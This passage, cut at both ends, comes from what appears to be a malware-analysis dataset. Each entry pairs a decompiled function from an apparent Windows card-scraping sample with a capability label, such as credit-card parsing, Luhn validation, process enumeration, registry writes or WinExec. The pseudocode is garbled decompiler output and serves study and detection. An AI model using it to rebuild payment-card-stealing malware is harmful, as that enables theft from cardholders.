0xf;\n    }\n    else {\n        uVar8 = 0xe;\n    }\n    puVar3 = *(uVar13 + 8);\n    *puVar10 = *(uVar13 + 0xc);\n    puVar10[-1] = puVar3;\n    puVar10[-2] = 0x403678;\n    Var22 = fcn.00401560(puVar10[-1]);\n    Var21 = Var22 & 0xffff00000000 | *0x4245fc;\n    if (Var22 != 0) {\n        *puVar10 = uVar8;\n        puVar10[-1] = 0x403685;\n        fcn.00402fe0();\n        puVar10[-1] = uVar8;\n        puVar10[-2] = 0x40368b;\n        fcn.004044f0();\n        return 0x1;\n    }\n    if (*0x4245fc == 0) {\n        return NULL;\n    }\ncode_r0x004036af:\n    *puVar10 = Var21;\n    *(puVar10 + -2) = Var21 >> 0x20;\n    *puVar10 = uVar13 - 0x110;\n    puVar10[-1] = puVar3;\n    puVar10[-2] = 0x4036d9;\n    puVar6 = fcn.00402e20(puVar10[-1], *puVar10);\n    if (puVar6 == NULL) {\n        uVar8 = 0;\n    }\n    else {\n        uVar8 = *(uVar13 - 0xc);\n    }\n    *puVar10 = uVar8;\n    puVar14 = *puVar10;\n    bVar18 = puVar14 < 0;\n    uVar4 = extraout_ECX_00;\n    uVar2 = extraout_DL;\n    if (puVar14 != NULL) {\n        *puVar10 = puVar3;\n        puVar10[-1] = 0x40370f;\n        puVar6 = fcn.00402c20(*puVar10);\n        bVar18 = puVar6 < 0;\n        uVar4 = extraout_ECX_01;\n        uVar2 = extraout_DL_00;\n        if (puVar6 == NULL) {\n            *(uVar13 - 0xc) = 0;\n            puVar14 = puVar6;\n        }\n    }\n    if (!bVar18) {\n        *puVar10 = puVar3;\n        puVar3 = *puVar10;\n        if (bVar18) {\n            *(puVar10 + 1) = in_ES;\n            puVar14 = puVar14 + -1;\n            puVar16 = puVar3 | uVar13;\n            puVar3 = puVar16 + 1;\n            *puVar16 = puVar6;\n            uVar2 = 0;\n        }\n    }\n    bVar18 = false;\n    puVar11 = puVar14;\n    if (puVar14 == NULL) {\n        *puVar10 = 0;\n        puVar10[-1] = puVar3;\n        puVar10[-2] = 0x403741;\n        puVar14 = fcn.00402520(puVar10[-1], *puVar10);\n        bVar18 = SCARRY4(puVar10 + -1, 8);\n        puVar11 = puVar10 + 1;\n        *(uVar13 - 0xc) = puVar14;\n        uVar4 = extraout_ECX_02;\n        uVar2 = extraout_DL_01;\n    }\n    if (bVar18 == puVar11 < 0) {\n        *(puVar10 + 2) = uVar4;\n        uVar4 = uVar4 & 0xffff0000 | *(puVar10 + 2);\n        if (bVar18 != puVar11 < 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    if (puVar14 != NULL) {\n        *puVar10 = 0xffffffff;\n        puVar10[-1] = 0x403769;\n        fcn.004044f0();\n        uVar4 = extraout_ECX_03;\n        uVar2 = extraout_DL_02;\n    }\n    *puVar10 = uVar4;\n    bVar18 = false;\n    bVar20 = false;\n    bVar19 = (uVar4 >> 8 | uVar2 | 0x1f) == 0;\n    *puVar10 = 1000;\n    pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n    puVar12 = puVar10 + -1;\n    puVar10[-1] = 0x403784;\n    (*pcVar1)();\n    if (!bVar20) {\n        *(puVar12 + -2) = extraout_DX;\n        if (bVar20) {\n            uVar17 = in(*(puVar12 + -2));\n            *puVar3 = uVar17;\n            if (bVar18 || bVar19) {\n                puVar12[-1] = 0x56;\n                return puVar14;\n            }\n            *puVar12 = uVar13 + 0xc;\n            puVar12[-1] = uVar13 + 8;\n            puVar12[-2] = puVar3 + 1;\n            puVar12[-3] = CONCAT31(uVar9 >> 8, 0xbc);\n            puVar12[-4] = 0x403823;\n            fcn.004045b0(puVar12[-3], puVar12[-2], puVar12[-1], *puVar12);\n            return 0x1;\n        }\n    }\n    puVar12[-1] = 0;\n    puVar12[-2] = 0x4241d8;\n    pcVar1 = _sym.imp.KERNEL32.dll_WinExec;\n    puVar12[-3] = 0x4037b5;\n    (*pcVar1)();\n    return puVar14;\n}\n",
        "token_count": 2630
    },
    "004042a0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004042f0) overlaps instruction at (ram,0x004042ee)\n// \n\nuint32_t fcn.004042a0(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t in_EAX;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    int32_t iVar4;\n    int32_t extraout_ECX_00;\n    uchar extraout_DL;\n    ushort extraout_DX;\n    uint8_t *unaff_EBX;\n    uchar *puVar5;\n    uint unaff_EDI;\n    uint *puVar6;\n    bool bVar7;\n    bool bVar8;\n    uint8_t uVar9;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    bool bVar10;\n    bool bVar11;\n    ulong uVar12;\n    uint arg_8h;\n    uchar uStack132;\n    uint auStack131 [7];\n    uchar uStack100;\n    uint auStack99 [7];\n    uchar uStack68;\n    uint auStack67 [7];\n    uchar uStack36;\n    uint auStack35 [7];\n    uchar uStack5;\n    \n    bVar10 = false;\n    if ((0x7f < &stack0xfffffffc) && (0x7f >= &stack0xfffffffc)) {\n        out(0xbd, in_EAX);\n        return in_EAX;\n    }\n    arg_8h = unaff_EDI;\n    iVar3 = fcn.00402da0();\n    if (iVar3 == 0) {\n        return 0;\n    }\n    uVar9 = unaff_EDI + -1 < 0;\n    bVar8 = unaff_EDI == 1;\n    fcn.00404430();\n    if (bVar8) goto code_r0x004042f7;\n    while( true ) {\n        if (bVar8) {\n            uVar1 = bVar10 * 0x400 | (in_IF & 1) * 0x200;\n            uVar2 = uVar1 | (in_TF & 1) * 0x100;\n            bVar10 = (uVar1 & 0x400) != 0;\n            in_IF = (uVar2 & 0x200) != 0;\n            in_TF = ((uVar2 | (uVar9 & 1) * 0x80) & 0x100) != 0;\n        }\ncode_r0x004042f7:\n        iVar3 = fcn.00404720(0x4241d0);\n        bVar7 = iVar3 != -1;\n        bVar11 = SBORROW4(iVar3, -1);\n        uVar9 = iVar3 + 1 < 0;\n        bVar8 = iVar3 == -1;\n        if (!bVar8) {\n            return 0;\n        }\n        fcn.00401ed0();\n        *0x424600 = 1;\n        if ((bVar7 || bVar8) || (!bVar7 && !bVar8)) break;\n        if (!bVar11) {\n            *0x424600 = 1;\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        in(extraout_DX);\n    }\n    iVar3 = fcn.00402eb0();\n    if (iVar3 != 0) {\n        return 0;\n    }\n    if ((iVar3 < 0) || (iVar4 = extraout_ECX,  uStack132 = extraout_DL,  iVar3 >= 0)) {\n        uStack132 = 0;\n        iVar4 = 7;\n    }\n    *unaff_EBX = *unaff_EBX & 0xc3;\n    *(iVar4 + 7) = *(iVar4 + 7) >> (iVar4 & 0x1f);\n    puVar6 = auStack35;\n    for (; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + bVar10 * -2 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + bVar10 * -4 + 2) = 0;\n    puVar6 = auStack131;\n    uStack100 = uStack132;\n    uStack36 = uStack132;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + bVar10 * -2 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + bVar10 * -4 + 2) = 0;\n    puVar6 = auStack99;\n    uStack68 = uStack132;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + bVar10 * -2 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + bVar10 * -4 + 2) = 0;\n    puVar6 = auStack67;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + bVar10 * -2 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + bVar10 * -4 + 2) = 0;\n    uVar12 = fcn.00404800(&uStack132, &uStack100, &uStack36, &uStack68);\n    iVar3 = uVar12;\n    if (iVar3 != 0) {\n        puVar5 = &stack0xfffffffc;\n        if ((0 < iVar3) && (puVar5 = &stack0xfffffffc,  iVar3 < 1)) {\n            *(iVar3 + -0x72c625aa) = *(iVar3 + -0x72c625aa) ^ extraout_ECX_00;\n            puVar5 = &uStack5;\n            if (extraout_ECX_00 != 1 && &uStack5 != NULL) {\n                unaff_EBX[1] = unaff_EBX[1] + ((uVar12 >> 0x20) + 1 >> 8);\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n        }\n        iVar3 = fcn.00402900(arg_8h);\n        if (iVar3 != 0) {\n            iVar3 = fcn.004034e0(puVar5 + -0x80, puVar5 + -0x60, puVar5 + -0x20, puVar5 + -0x40);\n            return iVar3 != 0;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 1571
    },
    "00404720": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x00404774)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00404720(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_10ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0xffffffff;\n    iVar1 = (**0x424604)(2, 0);\n    if (iVar1 != -1) {\n        var_130h = 0x128;\n        puVar3 = &var_12ch;\n        var_4h = iVar1;\n        for (iVar2 = 0x49; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar3 = 0;\n            puVar3 = puVar3 + 1;\n        }\n        iVar2 = (**0x424608)(iVar1, &var_130h);\n        while ((iVar2 != 0 && (iVar2 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_10ch, arg_8h),  iVar1 = var_4h,  iVar2 != 0)\n               )) {\n            iVar2 = (**0x42460c)(var_4h, &var_130h);\n            iVar1 = var_4h;\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return var_8h;\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 378
    },
    "00404b00": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404bc4) overlaps instruction at (ram,0x00404bbf)\n// \n\nuint __cdecl\nfcn.00404b00(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint32_t arg_1ch, uint *arg_20h)\n\n{\n    uint8_t *puVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint8_t in_CL;\n    uint8_t extraout_CL;\n    int32_t unaff_EBX;\n    uint32_t arg_ch_00;\n    uint *unaff_ESI;\n    uint *puVar4;\n    uint *puVar5;\n    uint *puVar6;\n    bool bVar7;\n    uint *unaff_retaddr;\n    uchar var_10ch;\n    uint var_10bh;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint *var_8h;\n    uchar *var_4h;\n    \n    if ((*0x10 != 0x110 && 0x10b < &stack0xfffffffc) &&\n       (*0x10 == 0x110 || SBORROW4(&stack0xfffffffc, 0x10c) != &stack0xfffffef0 < 0)) {\n        puVar1 = in_EAX + -0x74c625aa;\n        *puVar1 = *puVar1 ^ in_CL;\n        arg_ch_00 = unaff_EBX + 1;\n        arg_20h = unaff_ESI;\n        if (*puVar1 != 0) goto code_r0x00404b41;\n    }\n    fcn.00404d00(arg_18h, arg_1ch, arg_8h, 0x20, arg_20h + 8);\n    arg_ch_00 = arg_1ch;\ncode_r0x00404b41:\n    fcn.00404d00(arg_18h, arg_ch_00, arg_ch, 0x20, arg_20h + 0x18);\n    bVar7 = false;\n    uVar2 = fcn.00404d00(arg_18h, arg_1ch, arg_10h, 0x20, arg_20h + 0x28);\n    if ((bVar7) || (!bVar7)) {\n        uVar2 = arg_14h;\n    }\n    iVar3 = fcn.00404d00(&stack0x14458b72, arg_1ch ^ *(arg_1ch + 0xe58be73), uVar2, 0x20, arg_20h + 0x38);\n    if ((*0x10 != 0x11c && SCARRY4(&stack0xfffffebc, 0x28) == &stack0xfffffee4 < 0) &&\n       (*0x10 == 0x11c || SCARRY4(&stack0xfffffebc, 0x28) != &stack0xfffffee4 < 0)) {\n        *(iVar3 + -0x17c625aa) = *(iVar3 + -0x17c625aa) ^ extraout_CL;\n        out(0xfe, iVar3);\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar3 = func_0x00404ab0();\n    if (iVar3 == -1) {\n        iVar3 = (*_sym.imp.MSVCRT.dll_rand)();\n        *(arg_20h + 0x48) = iVar3 % 5;\n    }\n    else {\n        *(arg_20h + 0x48) = iVar3;\n    }\n    var_10ch = 0;\n    puVar5 = &fcn.00404b00::var_10bh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_4h = &stack0xfffffef0;\n    var_8h = &fcn.00404b00::var_8h;\n    uStack16 = 0x4243e0;\n    uStack20 = 0x4243b4;\n    uStack24 = 0x80000001;\n    uStack28 = 0x404c38;\n    iVar3 = fcn.00404500();\n    puVar4 = arg_8h;\n    puVar6 = unaff_retaddr;\n    if (iVar3 != 0) {\n        if ((0 < iVar3) && (iVar3 < 1)) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        var_4h = &stack0xfffffef0;\n        var_8h = 0x404c5f;\n        iVar3 = (*_sym.imp.MSVCRT.dll__stricmp)();\n        bVar7 = iVar3 == 0;\n        puVar6 = unaff_retaddr;\n        if ((bVar7) && ((bVar7 || (puVar4 = arg_20h,  puVar6 = puVar5 + 3,  !bVar7)))) {\n            *(arg_20h + 0x48) = *(arg_20h + 0x48) | 0x80;\n            puVar4 = arg_8h;\n            puVar6 = unaff_retaddr;\n        }\n    }\n    *puVar6 = *puVar4;\n    uVar2 = in(0x5d);\n    return uVar2;\n}\n",
        "token_count": 1295
    },
    "00402ef0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402ef0(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    if (arg_ch == 1) {\n        fcn.004018d0();\n        fcn.004042a0();\n        fcn.00404070();\n        if (*0x4245fc == 0) {\n            (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n            fcn.00403010();\n        }\n    }\n    (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 146
    },
    "00401870": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00401870(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00402ef0;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x424150;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 217
    },
    "00404430": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004044a7) overlaps instruction at (ram,0x004044a6)\n// \n\nuint fcn.00404430(void)\n\n{\n    char cVar1;\n    code *pcVar2;\n    code cVar3;\n    uchar *puVar4;\n    uint32_t uVar5;\n    char extraout_DL;\n    uint8_t uVar6;\n    int32_t unaff_EBX;\n    uchar *puVar7;\n    uchar uVar8;\n    uint8_t in_AF;\n    bool bVar9;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    unkbyte6 Var10;\n    \n    puVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x424260);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (puVar4 == NULL) {\n        return 0;\n    }\n    uVar6 = unaff_EBX >> 8;\n    uVar8 = 0xcf < uVar6;\n    bVar9 = uVar6 == 0xd0;\n    Var10 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(puVar4, 0x424270);\n    *0x424604 = Var10;\n    puVar7 = puVar4;\n    if ((!bVar9) && (bVar9)) {\n        puVar7 = puVar4 + 1;\n        out(*puVar4, Var10 >> 0x20);\n    }\n    *0x424608 = (*pcVar2)(puVar7, 0x42428c);\n    if (!uVar8) {\n        if (uVar8) {\n            cVar3 = SUB41(*0x424608, 0);\n            cVar1 = cVar3 - *pcVar2;\n            uVar5 = func_0x1018a419((in_NT & 1) * 0x4000 | SBORROW1(cVar3, *pcVar2) * 0x800 | (in_IF & 1) * 0x200 |\n                                    (in_TF & 1) * 0x100 | (cVar1 < '\\0') * 0x80 | (cVar1 == '\\0') * 0x40 |\n                                    (in_AF & 1) * 0x10 | ((POPCOUNT(cVar1) & 1U) == 0) * 4 | cVar3 < *pcVar2 |\n                                    (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 |\n                                    (in_AC & 1) * 0x40000);\n            puVar7[-2] = puVar7[-2] + extraout_DL + '\\x02';\n            *0x42460c = uVar5 & 0xffffff00 | *(unaff_EBX + (uVar5 & 0xff));\n            goto code_r0x004044af;\n        }\n    }\n    *0x42460c = (*pcVar2)(puVar7, 0x42429c);\ncode_r0x004044af:\n    if (((*0x424604 != 0) && (*0x424608 != 0)) && (*0x42460c != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 788
    },
    "00402520": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402520(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    uchar var_264h;\n    uint var_263h;\n    char var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    char *var_20h;\n    char *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    var_264h = 0;\n    puVar5 = &var_263h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_160h = '\\0';\n    puVar5 = &var_15fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_ch = 1;\n    var_4h = 0;\n    var_8h = 1;\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_160h, 0x4241e8, arg_8h);\n    (*pcVar2)(&var_264h, 0x424200, arg_8h);\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_20h = &var_160h;\n    var_18h = &var_ch;\n    var_14h = &var_4h;\n    var_10h = &var_8h;\n    uVar4 = 0xffffffff;\n    pcVar6 = &var_160h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_48h = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar6 = arg_8h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_34h = 0x424228;\n    var_30h = 0x424234;\n    var_2ch = 0x424240;\n    var_28h = 0x424250;\n    var_24h = 0x424258;\n    var_5ch = 2;\n    var_58h = 1;\n    var_54h = 4;\n    var_50h = 4;\n    var_4ch = 4;\n    var_1ch = arg_8h;\n    var_44h = ~uVar4 - 1;\n    var_40h = 4;\n    var_3ch = 4;\n    var_38h = 4;\n    if ((arg_ch != 0) < 5) {\n        uVar4 = (arg_ch != 0) * 4;\n        do {\n            iVar3 = (*pcVar2)(0x80000002, &var_264h, *(&var_34h + uVar4), *(&var_5ch + uVar4), *(&var_20h + uVar4), \n                              *(&var_48h + uVar4));\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uVar4 = uVar4 + 4;\n        } while (uVar4 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1086
    },
    "00402da0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402dd1) overlaps instruction at (ram,0x00402dd0)\n// \n\nuint fcn.00402da0(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint8_t *unaff_EBX;\n    uint *unaff_ESI;\n    bool bVar3;\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    \n    bVar3 = &lpVersionInformation < 0;\n    lpVersionInformation = 0x94;\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetVersionExA)();\n    if ((bVar3) || (!bVar3)) {\n        if (var_90h != 5) {\n            if ((var_90h == 6) && (var_8ch == 0)) {\n                return 1;\n            }\n            return 0;\n        }\n        iVar1 = 1;\n        unaff_ESI = &lpVersionInformation;\n    }\n    *unaff_EBX = *unaff_EBX & 0xc3;\n    *0x1b80a75 = *0x1b80a75 + 1;\n    *unaff_ESI = *unaff_ESI + unaff_ESI;\n    *(iVar1 + -0x1bf31e4b) = *(iVar1 + -0x1bf31e4b) + unaff_EBX;\n    uVar2 = in(0x5d);\n    return uVar2;\n}\n",
        "token_count": 339
    },
    "00403950": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint32_t __cdecl fcn.00403950(uint s1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    uint uStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uStack40 = s1;\n    puVar1 = (*_sym.imp.MSVCRT.dll__strlwr)();\n    if (&uStack40 < 0xfffffffc) {\n        if (&uStack40 >= 0xfffffffc) {\n            if (&stack0xffffffdc < *puVar1 || puVar1 + 1U == 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            return puVar1 + 1U;\n        }\n    }\n    var_14h = 0x42459c;\n    var_10h = 0x424594;\n    var_ch = 0x4245a4;\n    var_8h = 0x4245ac;\n    var_4h = 0x4245b4;\n    uVar4 = 0;\n    puVar3 = &var_14h;\n    do {\n        uStack40 = *puVar3;\n        iVar2 = (*_sym.imp.MSVCRT.dll_strstr)(s1);\n        if (iVar2 != 0) {\n            return 1;\n        }\n        uVar4 = uVar4 + 1;\n        puVar3 = puVar3 + 1;\n    } while (uVar4 < 5);\n    uStack40 = 0x42458c;\n    iVar2 = (*_sym.imp.MSVCRT.dll_strstr)(s1);\n    return iVar2 == 0;\n}\n",
        "token_count": 433
    },
    "null": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "004027c0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.004027c0(uint32_t arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    if (arg_10h == 0) {\n        return (arg_8h >> 0x10) + arg_8h;\n    }\n    do {\n        arg_8h = arg_8h + *arg_ch;\n        if (arg_8h >> 0x10 != 0) {\n            arg_8h = (arg_8h >> 0x10) + (arg_8h & 0xffff);\n        }\n        arg_ch = arg_ch + 1;\n        arg_10h = arg_10h + -1;\n    } while (arg_10h != 0);\n    return (arg_8h >> 0x10) + arg_8h;\n}\n",
        "token_count": 206
    },
    "004045b0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004046a1) overlaps instruction at (ram,0x0040469d)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.004045b0(uint *arg_8h, int32_t arg_ch, uint *arg_10h, int32_t *arg_14h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *unaff_ESI;\n    bool bVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar2 = fcn.004027c0(0, arg_8h, arg_ch + 1U >> 1);\n    uVar2 = uVar2 & 0xffff;\n    iVar3 = (*_sym.imp.dbghelp.dll_ImageNtHeader)();\n    uVar1 = *(iVar3 + 0x58);\n    if (uVar2 < uVar1) {\n        bVar5 = false;\n        iVar4 = (uVar2 - uVar1 & 0xffff) - 1;\n    }\n    else {\n        bVar5 = uVar2 < (uVar1 & 0xffff);\n        iVar4 = uVar2 - (uVar1 & 0xffff);\n    }\n    if ((!bVar5 && iVar4 != 0) && (bVar5 || iVar4 == 0)) {\n        *arg_8h = *unaff_ESI;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    if (iVar4 < uVar1 >> 0x10) {\n        iVar4 = (iVar4 - (uVar1 >> 0x10) & 0xffff) - 1;\n    }\n    else {\n        iVar4 = iVar4 - (uVar1 >> 0x10);\n    }\n    *arg_14h = iVar4 + arg_ch;\n    *arg_10h = *(iVar3 + 0x58);\n    return;\n}\n",
        "token_count": 471
    },
    "00402a20": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402b94) overlaps instruction at (ram,0x00402b90)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00402a20(int16_t *arg_8h)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t extraout_ECX;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    int16_t unaff_BX;\n    uint32_t uVar10;\n    uchar *puVar11;\n    uint unaff_ESI;\n    uint *puVar12;\n    uint32_t unaff_EDI;\n    uint *puVar13;\n    bool bVar14;\n    uint8_t in_AF;\n    bool bVar15;\n    unkbyte10 extraout_ST0;\n    unkbyte10 Var16;\n    unkbyte10 extraout_ST0_00;\n    unkbyte10 Var17;\n    unkbyte10 extraout_ST1;\n    unkbyte10 extraout_ST1_00;\n    unkbyte10 in_ST2;\n    unkbyte10 Var18;\n    unkbyte10 in_ST3;\n    unkbyte10 in_ST4;\n    unkbyte10 in_ST5;\n    unkbyte10 in_ST6;\n    unkbyte10 in_ST7;\n    ulong uVar19;\n    uint uStack25;\n    uint uStack21;\n    uint32_t uStack17;\n    uchar uStack13;\n    uint var_4h;\n    \n    puVar12 = &stack0xfffffffc;\n    puVar13 = &stack0xfffffffc;\n    uStack13 = unaff_ESI >> 0x18;\n    uStack17._0_1_ = unaff_EDI >> 0x18;\n    uStack17 = CONCAT31(unaff_ESI, uStack17);\n    if (*arg_8h != 0x5a4d) {\n        return 0;\n    }\n    bVar14 = CARRY4(*(arg_8h + 0x1e), arg_8h);\n    piVar3 = *(arg_8h + 0x1e) + arg_8h;\n    if ((!bVar14 && piVar3 != NULL) && (bVar14 || piVar3 == NULL)) {\n        arg_8h = unaff_EDI & 0xffffff | uStack17 << 0x18;\n    }\n    bVar14 = (POPCOUNT(*piVar3 - 0x4550U & 0xff) & 1U) != 0;\n    if (*piVar3 - 0x4550U != 0) {\n        return 0;\n    }\n    if ((bVar14) && (!bVar14)) {\n        puVar13 = &uStack21;\n        cVar1 = '\\x1e';\n        do {\n            puVar12 = puVar12 + -1;\n            puVar13 